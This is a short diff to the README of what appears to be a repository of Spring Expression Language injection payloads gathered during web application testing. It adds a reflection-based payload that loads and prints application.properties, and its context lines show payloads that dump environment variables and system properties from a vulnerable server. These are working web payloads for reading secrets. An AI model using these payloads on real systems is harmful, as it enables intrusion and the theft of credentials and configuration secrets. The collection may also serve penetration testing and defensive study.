@@ -17,6 +17,7 @@ So, this repository was born from payloads developed during a regular web applic
 ```Java
 T(java.lang.System).getenv().toString()
 T(java.lang.System).getProperties().toString()
+"".getClass().forName("org.springframework.core.io.support.PropertiesLoaderUtils").getMethod("loadAllProperties","".getClass()).invoke("","application.properties").toString()
 ```
 
 ## Reading command output
